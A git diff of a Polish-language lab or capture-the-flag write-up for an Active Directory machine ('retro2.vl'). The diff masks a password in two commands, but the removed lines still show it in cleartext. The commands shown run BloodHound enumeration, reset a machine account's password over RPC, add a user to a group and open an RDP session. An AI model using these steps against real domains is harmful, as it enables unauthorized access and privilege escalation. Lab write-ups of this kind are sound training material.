@@ -129,7 +129,7 @@ I exported data to .txt file
 `ldapreader` więc chyba coś z ldapem hehe.
 Ale ja machnę bloodhounda bo to samo da i więcej
 
-`bloodhound-python -d retro2.vl -c all -u ldapreader -p ppYaVcB5R -ns 10.10.77.186`
+`bloodhound-python -d retro2.vl -c all -u ldapreader -p p<hidden>R -ns 10.10.77.186`
 
 Widzimy kilka komputerów... mam pomysł z poprzedniego retro
 
@@ -187,7 +187,7 @@ net rpc password 'ADMWS01$' Test@321 -U retro2.vl/'fs01$'%Test123@ -S bln01.retr
 ```
 net rpc group addmem "SERVICES" "ldapreader" -U retro2.vl/"ADMWS01$" -S BLN01.retro2.vl
 net rpc group members "SERVICES" -U retro2.vl/"ADMWS01$" -S BLN01.retro2.vl
-xfreerdp /u:ldapreader /p:ppYaVcB5R /v:10.10.98.90 /tls-seclevel:0
+xfreerdp /u:ldapreader /p:p<hidden>R /v:10.10.98.90 /tls-seclevel:0
 ```
 
 ![{BE79DFB4-6024-4D78-885B-3FA73F561919}](https://github.com/user-attachments/assets/993ffc2c-fb99-4896-84f2-dd07ad9217c7)
